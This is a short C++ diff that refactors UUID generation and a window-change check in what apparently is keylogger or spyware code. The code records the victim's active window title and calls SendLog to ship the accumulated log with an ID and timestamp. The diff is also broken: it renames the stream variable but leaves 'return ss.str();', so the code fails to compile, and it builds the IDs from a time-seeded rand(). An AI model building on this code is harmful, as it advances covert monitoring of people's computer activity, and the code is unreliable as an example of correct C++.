@@ -13,12 +13,12 @@ string GetCurrentDate() {
 }
 
 string GenerateUUID() {
-    stringstream ss;
+    stringstream id;
     srand((unsigned int)time(nullptr));
 
     for (int i = 0; i < 32; i++) {
-        ss << uppercase << hex << rand() % 16;
-        if (i == 7 || i == 11 || i == 15 || i == 19) ss << '-';
+        id << uppercase << hex << rand() % 16;
+        if (i == 7 || i == 11 || i == 15 || i == 19) id << '-';
     }
     
     return ss.str();
@@ -34,11 +34,9 @@ void CheckWindowChange(string &log_text) {
         current_window.erase(remove(current_window.begin(), current_window.end(), '?'), current_window.end());
     }
 
-    if (last_window == current_window)
-        return;
-
-    SendLog(log_text, GetCurrentDate());
-
-    log_text += "[" + Uuid + "] :: [" + current_window + "] :: [" + GetCurrentDate() + "]\r\n";
-    last_window = current_window;
+    if (last_window != current_window) {
+        SendLog(log_text, GetCurrentDate());
+        log_text += "[" + Uuid + "] :: [" + current_window + "] :: [" + GetCurrentDate() + "]\r\n";
+        last_window = current_window;
+    }    
 }
